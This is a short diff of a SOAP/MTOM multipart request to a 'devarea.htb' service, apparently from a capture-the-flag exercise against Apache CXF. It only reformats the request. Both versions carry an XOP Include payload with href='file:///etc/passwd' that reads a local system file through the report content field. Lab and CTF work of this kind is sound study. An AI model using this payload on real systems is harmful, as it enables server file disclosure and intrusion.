@@ -104,17 +104,16 @@ Content-ID: <root.message@cxf.apache.org>
 
 <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
   <soap:Body>
-    <submitReport xmlns="http://devarea.htb/">
+    <dev:submitReport xmlns:dev="http://devarea.htb/">
       <arg0>
         <employeeName>test</employeeName>
         <department>test</department>
         <content>
-          <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" 
-                       href="file:///etc/passwd"/>
+          <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/>
         </content>
         <confidential>false</confidential>
       </arg0>
-    </submitReport>
+    </dev:submitReport>
   </soap:Body>
 </soap:Envelope>
 --MIME_boundary--
